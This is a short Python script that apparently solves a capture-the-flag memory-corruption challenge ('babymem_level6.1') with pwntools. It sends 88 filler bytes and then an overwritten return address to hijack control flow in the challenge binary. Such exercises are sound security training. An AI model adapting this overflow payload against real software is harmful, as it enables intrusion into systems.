import pwn
with open("output.txt","w") as f:
    r = pwn.process("/challenge/babymem_level6.1", stdout=f)
    r.sendline("1024")
    r.send(b'\x00'*88+b'\xd5\x18\x40')
